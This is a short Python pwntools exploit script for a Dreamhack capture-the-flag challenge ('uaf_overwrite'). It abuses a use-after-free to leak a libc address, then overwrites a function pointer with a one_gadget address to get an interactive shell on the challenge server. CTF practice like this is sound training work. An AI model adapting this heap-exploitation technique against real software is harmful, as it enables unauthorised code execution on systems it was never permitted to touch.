#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF('uaf_overwrite_patched', checksec = False)
libc = ELF('libc-2.27.so', checksec = False)
# p = process(exe.path)
p = remote("host3.dreamhack.games", 8215)

one_gadget = 0x10a41c


def human(w, age):
    p.sendlineafter(">", "1")
    p.sendlineafter(": ", str(w))
    p.sendlineafter(": ", str(age))

def robot(size):
    p.sendlineafter(">", "2")
    p.sendlineafter(": ", str(size))

def custom(size, data, idx):
    p.sendlineafter(">", "3")
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", str(data))
    p.sendlineafter(": ", str(idx))

# input()

custom(1280, "AAAA", 10)
custom(1280, "AAAA", 10)
custom(1280, "AAAA", 0)
custom(1280, "B", 10)

libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x3ebc42
one_gadget += libc.address
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))
log.info("one gadget: " + hex(one_gadget))

human(100, one_gadget)
robot(100)

p.interactive()